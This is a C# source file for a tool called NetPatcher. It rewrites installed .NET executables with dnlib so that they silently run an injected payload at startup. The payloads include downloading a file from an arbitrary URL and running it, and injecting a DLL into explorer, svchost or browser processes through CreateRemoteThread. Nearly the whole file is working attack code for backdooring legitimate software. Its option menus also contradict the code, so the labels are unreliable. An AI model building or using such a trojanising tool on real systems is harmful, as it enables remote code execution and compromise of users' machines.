/* Author		: Gregory King
 * Date		: 07/16/25
 * Description	: This program is a .NET patcher that allows users to modify .NET applications to execute specific actions. The program will find compatible binaries in the Program Files, Program Files (x86) or user profile directories, and then applies the specified patch based on user input. The patched executable will be copied to the current directory with a new name. This version uses dnlib for binary manipulation. The patched program will execute the injected payload immediately when started. After the payload, the original program logic resumes, unless the payload itself interrupts or terminates execution (for example, if the payload throws an exception or calls Environment.Exit).
 * 
 * Patching options:
 * 1) popcalc
 * 2) MessageBox
 * 3) Download + exec
 * 4) Inject DLL to thread using CreateRemoteThread, selects process to inject from list of processes.
 */

using System;
using System.Collections.Generic;
using System.IO;
using dnlib.DotNet;
using dnlib.DotNet.Emit;

namespace NetPatcher
{ 
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Welcome to NetPatcher!");
            Console.WriteLine("Searching for .NET assemblies that are patchable... Please wait.");

			var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var searchDirs = new[] { @"C:\Program Files (x86)", @"C:\Program Files", userProfile };
            var assemblies = new List<string>();
            foreach (var dir in searchDirs)
            {
                try
                {
                    foreach (var file in Directory.EnumerateFiles(dir, "*.exe", SearchOption.AllDirectories))
                    {
                        try
                        {   
                            /* check if it's a .net assembly */
                            using (var module = ModuleDefMD.Load(file))
                            {
                                if (module.EntryPoint != null)
                                {
                                    assemblies.Add(file);
                                    if (assemblies.Count >= 50) break;
                                }
                            }
                        }
                        catch { }
                    }
                }
                catch { }
                if (assemblies.Count >= 50) break;
            }

            if (assemblies.Count == 0)
            {
                Console.WriteLine("No .NET assemblies found.");
                return;
            }

            Console.WriteLine("Select a .NET assembly to patch:");
            for (int i = 0; i < assemblies.Count; i++)
                Console.WriteLine($"{i + 1}: {assemblies[i]}");
            Console.Write("Choice: ");
            if (!int.TryParse(Console.ReadLine(), out int fileChoice) || fileChoice < 1 || fileChoice > assemblies.Count)
            {
                Console.WriteLine("Invalid choice.");
                return;
            }
            string path = assemblies[fileChoice - 1];

            Console.WriteLine("Select payload to inject:");
            Console.WriteLine("1. Execute calc.exe");
            Console.WriteLine("2. Download and execute file");
            Console.WriteLine("3. Show message box");
            Console.WriteLine("4. Inject DLL into another process (explorer, svchost, firefox, msedge, chrome)");
            Console.Write("Choice: ");
            var payloadChoice = Console.ReadLine();

            try
            {
                var module = ModuleDefMD.Load(path);
                var entry = module.EntryPoint;
                if (entry == null)
                {
                    Console.WriteLine("No entry point found.");
                    return;
                }
                var instrs = entry.Body.Instructions;

                switch (payloadChoice)
                {
                    case "1": /* pop calc */
                        var processStart = module.Import(typeof(System.Diagnostics.Process).GetMethod("Start", new[] { typeof(string) }));
                        instrs.Insert(0, OpCodes.Ldstr.ToInstruction("calc.exe"));
                        instrs.Insert(1, OpCodes.Call.ToInstruction(processStart));
                        instrs.Insert(2, OpCodes.Pop.ToInstruction());
                        break;

                    case "2":
						/* show message box */
						var showMsgBox = module.Import(typeof(System.Windows.Forms.MessageBox).GetMethod("Show", new[] { typeof(string) }));
                        instrs.Insert(0, OpCodes.Ldstr.ToInstruction("patched by NetPatcher"));
                        instrs.Insert(1, OpCodes.Call.ToInstruction(showMsgBox));
                        instrs.Insert(2, OpCodes.Pop.ToInstruction());
                        break;

					case "3":
						/* download and execute file */
						Console.Write("Enter URL to download: ");
						string url = Console.ReadLine();
						Console.Write("Enter filename to save as (e.g. C:\\Windows\\Temp\\payload.exe): ");
						string filename = Console.ReadLine();

						var webClientCtor = module.Import(typeof(System.Net.WebClient).GetConstructor(Type.EmptyTypes));
						var downloadFile = module.Import(typeof(System.Net.WebClient).GetMethod("DownloadFile", new[] { typeof(string), typeof(string) }));
						var processStart2 = module.Import(typeof(System.Diagnostics.Process).GetMethod("Start", new[] { typeof(string) }));

						instrs.Insert(0, OpCodes.Newobj.ToInstruction(webClientCtor));
						instrs.Insert(1, OpCodes.Dup.ToInstruction());
						instrs.Insert(2, OpCodes.Ldstr.ToInstruction(url));
						instrs.Insert(3, OpCodes.Ldstr.ToInstruction(filename));
						instrs.Insert(4, OpCodes.Callvirt.ToInstruction(downloadFile));
						instrs.Insert(5, OpCodes.Pop.ToInstruction());
						instrs.Insert(6, OpCodes.Ldstr.ToInstruction(filename));
						instrs.Insert(7, OpCodes.Call.ToInstruction(processStart2));
						instrs.Insert(8, OpCodes.Pop.ToInstruction());
						break;

					case "4":
						/* prompt for dll path */
						Console.Write("Enter full path of DLL to inject: ");
						string dllPath = Console.ReadLine();

						var typeDef = module.GlobalType;

						// Add P/Invoke methods
						var openProcess = new MethodDefUser(
							"OpenProcess",
							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.Int32, module.CorLibTypes.Boolean, module.CorLibTypes.Int32),
							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
						);
						typeDef.Methods.Add(openProcess);

						openProcess.ImplMap = new ImplMapUser {
							Module = new ModuleRefUser(module, "kernel32.dll"),
							Name = "OpenProcess",
							Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto | PInvokeAttributes.SupportsLastError
						};

						var virtualAllocEx = new MethodDefUser(
							"VirtualAllocEx",
							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.UInt32, module.CorLibTypes.UInt32, module.CorLibTypes.UInt32),
							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
						)
						{	
							ImplMap = new ImplMapUser {
								Module = new ModuleRefUser(module, "kernel32.dll"),
								Name = "VirtualAllocEx",
								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
							}
						};
						typeDef.Methods.Add(virtualAllocEx);

						var writeProcessMemory = new MethodDefUser(
							"WriteProcessMemory",
							MethodSig.CreateStatic(module.CorLibTypes.Boolean, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, new SZArraySig(module.CorLibTypes.Byte), module.CorLibTypes.UInt32, new ByRefSig(module.CorLibTypes.UIntPtr)),
							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
						)
						{
							ImplMap = new ImplMapUser
							{
								Module = new ModuleRefUser(module, "kernel32.dll"),
								Name = "WriteProcessMemory",
								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
							}
						};
						typeDef.Methods.Add(writeProcessMemory);

						var getModuleHandle = new MethodDefUser(
							"GetModuleHandle",
							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.String),
							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
						)
						{
							ImplMap = new ImplMapUser
							{
								Module = new ModuleRefUser(module, "kernel32.dll"),
								Name = "GetModuleHandleA",
								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
							}
						};
						typeDef.Methods.Add(getModuleHandle);

						var getProcAddress = new MethodDefUser(
							"GetProcAddress",
							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.String),
							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
						)
						{
							ImplMap = new ImplMapUser
							{
								Module = new ModuleRefUser(module, "kernel32.dll"),
								Name = "GetProcAddress",
								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
							}
						};
						typeDef.Methods.Add(getProcAddress);

						var createRemoteThread = new MethodDefUser(
							"CreateRemoteThread",
							MethodSig.CreateStatic(module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.UInt32, module.CorLibTypes.IntPtr, module.CorLibTypes.IntPtr, module.CorLibTypes.UInt32, module.CorLibTypes.IntPtr),
							MethodImplAttributes.PreserveSig | MethodImplAttributes.Managed,
							MethodAttributes.Private | MethodAttributes.Static | MethodAttributes.PinvokeImpl
						)
						{
							ImplMap = new ImplMapUser
							{
								Module = new ModuleRefUser(module, "kernel32.dll"),
								Name = "CreateRemoteThread",
								Attributes = PInvokeAttributes.CallConvWinapi | PInvokeAttributes.CharSetAuto
							}
						};
						typeDef.Methods.Add(createRemoteThread);

						// InjectDllIntoProcess method
						var injectHelper = new MethodDefUser(
							"InjectDllIntoProcess",
							MethodSig.CreateStatic(module.CorLibTypes.Void, module.CorLibTypes.Int32, module.CorLibTypes.String),
							MethodImplAttributes.IL | MethodImplAttributes.Managed,
							MethodAttributes.Private | MethodAttributes.Static
						);
						typeDef.Methods.Add(injectHelper);

						var il2 = new CilBody();
						injectHelper.Body = il2;
						injectHelper.Body.InitLocals = true;
						il2.KeepOldMaxStack = true;

						// Locals
						var localProcessHandle = new Local(module.CorLibTypes.IntPtr);
						var localAlloc = new Local(module.CorLibTypes.IntPtr);
						var localBytes = new Local(new SZArraySig(module.CorLibTypes.Byte));
						var localWritten = new Local(module.CorLibTypes.UIntPtr);
						var localKernel32 = new Local(module.CorLibTypes.IntPtr);
						var localLoadLibrary = new Local(module.CorLibTypes.IntPtr);
						var localThread = new Local(module.CorLibTypes.IntPtr);
						injectHelper.Body.Variables.Add(localProcessHandle);
						injectHelper.Body.Variables.Add(localAlloc);
						injectHelper.Body.Variables.Add(localBytes);
						injectHelper.Body.Variables.Add(localWritten);
						injectHelper.Body.Variables.Add(localKernel32);
						injectHelper.Body.Variables.Add(localLoadLibrary);
						injectHelper.Body.Variables.Add(localThread);

						// Constants
						const int PROCESS_ALL_ACCESS = 0x1F0FFF;
						const uint MEM_COMMIT = 0x1000;
						const uint PAGE_READWRITE = 0x04;

						// IL: IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
						il2.Instructions.Add(OpCodes.Ldc_I4.ToInstruction(PROCESS_ALL_ACCESS));
						il2.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
						il2.Instructions.Add(OpCodes.Ldarg_0.ToInstruction());
						il2.Instructions.Add(OpCodes.Call.ToInstruction(openProcess));
						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localProcessHandle));

						// IL: byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dllPath + "\0");
						var encodingType = module.Import(typeof(System.Text.Encoding));
						var getEncoding = module.Import(typeof(System.Text.Encoding).GetProperty("ASCII").GetGetMethod());
						var getBytes = module.Import(typeof(System.Text.Encoding).GetMethod("GetBytes", new[] { typeof(string) }));
						il2.Instructions.Add(OpCodes.Call.ToInstruction(getEncoding));
						il2.Instructions.Add(OpCodes.Ldarg_1.ToInstruction());
						il2.Instructions.Add(OpCodes.Ldstr.ToInstruction("\0"));
						var stringConcat2 = module.Import(typeof(string).GetMethod("Concat", new[] { typeof(string), typeof(string) }));
						il2.Instructions.Add(OpCodes.Call.ToInstruction(stringConcat2));
						il2.Instructions.Add(OpCodes.Callvirt.ToInstruction(getBytes));
						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localBytes));

						// IL: IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)bytes.Length, MEM_COMMIT, PAGE_READWRITE);
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
						il2.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
						il2.Instructions.Add(OpCodes.Ldlen.ToInstruction());
						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
						il2.Instructions.Add(OpCodes.Ldc_I4.ToInstruction((int)MEM_COMMIT));
						il2.Instructions.Add(OpCodes.Ldc_I4.ToInstruction((int)PAGE_READWRITE));
						il2.Instructions.Add(OpCodes.Call.ToInstruction(virtualAllocEx));
						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localAlloc));

						// IL: UIntPtr written;
						// IL: WriteProcessMemory(hProcess, alloc, bytes, (uint)bytes.Length, out written);
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localAlloc));
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localBytes));
						il2.Instructions.Add(OpCodes.Ldlen.ToInstruction());
						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
						il2.Instructions.Add(OpCodes.Ldloca_S.ToInstruction(localWritten));
						il2.Instructions.Add(OpCodes.Call.ToInstruction(writeProcessMemory));
						il2.Instructions.Add(OpCodes.Pop.ToInstruction());

						// IL: IntPtr kernel32 = GetModuleHandle("kernel32.dll");
						il2.Instructions.Add(OpCodes.Ldstr.ToInstruction("kernel32.dll"));
						il2.Instructions.Add(OpCodes.Call.ToInstruction(getModuleHandle));
						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localKernel32));

						// IL: IntPtr loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localKernel32));
						il2.Instructions.Add(OpCodes.Ldstr.ToInstruction("LoadLibraryA"));
						il2.Instructions.Add(OpCodes.Call.ToInstruction(getProcAddress));
						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localLoadLibrary));

						// IL: IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibrary, alloc, 0, IntPtr.Zero);
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcessHandle));
						il2.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
						il2.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localLoadLibrary));
						il2.Instructions.Add(OpCodes.Ldloc.ToInstruction(localAlloc));
						il2.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
						il2.Instructions.Add(OpCodes.Conv_U4.ToInstruction());
						il2.Instructions.Add(OpCodes.Ldsfld.ToInstruction(module.Import(typeof(IntPtr).GetField("Zero"))));
						il2.Instructions.Add(OpCodes.Call.ToInstruction(createRemoteThread));
						il2.Instructions.Add(OpCodes.Stloc.ToInstruction(localThread));

						il2.Instructions.Add(OpCodes.Ret.ToInstruction());

						// InjectDll method (searches for process and calls InjectDllIntoProcess)
						var injectedMethod = new MethodDefUser(
							"InjectDll",
							MethodSig.CreateStatic(module.CorLibTypes.Void),
							MethodImplAttributes.IL | MethodImplAttributes.Managed,
							MethodAttributes.Public | MethodAttributes.Static
						);
						typeDef.Methods.Add(injectedMethod);

						var il = new CilBody();
						injectedMethod.Body = il;
						injectedMethod.Body.InitLocals = true;
						il.KeepOldMaxStack = true;

						var processTypeSig = module.Import(typeof(System.Diagnostics.Process)).ToTypeSig();
						var processArrayTypeSig = new SZArraySig(processTypeSig);
						var localProcs = new Local(processArrayTypeSig);
						var localTarget = new Local(processTypeSig);
						injectedMethod.Body.Variables.Add(localProcs);
						injectedMethod.Body.Variables.Add(localTarget);

						string[] preferred = { "explorer", "svchost", "firefox", "msedge", "chrome" };
						var getProcessesByName = module.Import(typeof(System.Diagnostics.Process).GetMethod("GetProcessesByName", new[] { typeof(string) }));
						var processIdProp = module.Import(typeof(System.Diagnostics.Process).GetProperty("Id").GetGetMethod());

						var lblFound = new Instruction(OpCodes.Nop);
						var lblEnd = new Instruction(OpCodes.Ret);

						foreach (var procName in preferred)
						{
							il.Instructions.Add(OpCodes.Ldstr.ToInstruction(procName));
							il.Instructions.Add(OpCodes.Call.ToInstruction(getProcessesByName));
							il.Instructions.Add(OpCodes.Stloc.ToInstruction(localProcs));
							il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
							il.Instructions.Add(OpCodes.Ldlen.ToInstruction());
							il.Instructions.Add(OpCodes.Conv_I4.ToInstruction());
							il.Instructions.Add(OpCodes.Brtrue.ToInstruction(lblFound));
						}
						il.Instructions.Add(OpCodes.Br.ToInstruction(lblEnd));

						il.Instructions.Add(lblFound);
						il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localProcs));
						il.Instructions.Add(OpCodes.Ldc_I4_0.ToInstruction());
						il.Instructions.Add(OpCodes.Ldelem_Ref.ToInstruction());
						il.Instructions.Add(OpCodes.Stloc.ToInstruction(localTarget));

						il.Instructions.Add(OpCodes.Ldloc.ToInstruction(localTarget));
						il.Instructions.Add(OpCodes.Callvirt.ToInstruction(processIdProp));
						il.Instructions.Add(OpCodes.Ldstr.ToInstruction(dllPath));
						il.Instructions.Add(OpCodes.Call.ToInstruction(injectHelper));
						il.Instructions.Add(lblEnd);

						// Insert call to injected method at entry
						instrs.Insert(0, OpCodes.Call.ToInstruction(injectedMethod));
						break;
					default:
                        Console.WriteLine("Invalid payload choice.");
                        return;
                }

                string patchedPath = Path.Combine(
                    Directory.GetCurrentDirectory(),
                    Path.GetFileNameWithoutExtension(path) + "_patched" + Path.GetExtension(path));
                module.Write(patchedPath);
                Console.WriteLine($"Patched .NET assembly saved as: {patchedPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error patching .NET assembly: {ex.Message}");
            }
        }
    }
}

